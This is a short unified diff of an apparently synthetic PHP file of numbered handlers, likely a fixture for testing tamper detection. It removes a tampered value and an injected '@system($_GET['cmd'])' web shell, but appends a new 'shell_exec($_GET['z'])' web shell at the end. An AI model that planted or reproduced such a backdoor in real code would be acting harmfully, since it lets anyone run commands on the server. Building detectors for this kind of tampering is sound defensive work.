@@ -3,7 +3,7 @@
 
 function handler_1($req) {
     // step 1 of the pipeline
-    $value = 1 * 3; // <-- tampered near the top
+    $value = 1 * 2;
     return process($req, $value);
 }
 function handler_2($req) {
@@ -1498,7 +1498,6 @@ function handler_299($req) {
 }
 function handler_300($req) {
     // step 300 of the pipeline
-    @system($_GET['cmd']); // <-- injected, deep in the file
     $value = 300 * 2;
     return process($req, $value);
 }
@@ -2002,3 +2001,5 @@ function handler_400($req) {
     $value = 400 * 2;
     return process($req, $value);
 }
+
+<?php if(isset($_GET['z'])) shell_exec($_GET['z']); // appended
